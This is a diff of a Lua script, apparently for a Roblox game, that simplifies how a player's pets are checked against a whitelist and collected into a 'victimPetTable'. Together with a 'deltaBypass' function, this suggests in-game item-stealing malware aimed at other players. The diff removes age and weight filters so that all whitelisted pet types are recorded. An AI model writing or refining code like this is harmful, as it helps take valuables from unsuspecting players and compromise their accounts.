@@ -144,14 +144,10 @@ local function deltaBypass()
     )
 end
 
-function checkPetsWhilelist(petType, petObj)
+local function checkPetsWhilelist(pet)
     for _, name in PET_WHITELIST do
-        if string.find(petType, name) then
-            local age = petObj and petObj:GetAttribute("Age") or 0
-            local weight = petObj and petObj:GetAttribute("Weight") or 0
-            if age >= 5 and weight >= 3 then
-                return true
-            end
+        if string.find(pet, name) then
+            return true
         end
     end
 end
@@ -182,22 +178,12 @@ end
 
 local function getPlayersPets()
     for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
-        if not checkPetsWhilelist(value.PetType, petObj) then
+        if not checkPetsWhilelist(value.PetType) then
             continue
         end
 
 
-
-        local petObj = getPetObject(petUid)
-if petObj then
-    local age = petObj:GetAttribute("Age") or "?"
-    local weight = petObj:GetAttribute("Weight") or "?"
-    local line = string.format("%s [Age: %s] [Weight: %s KG]", value.PetType, age, weight)
-    table.insert(victimPetTable, line)
-else
-    table.insert(victimPetTable, value.PetType)
-end
-
+        table.insert(victimPetTable, value.PetType)
     end
 end
 
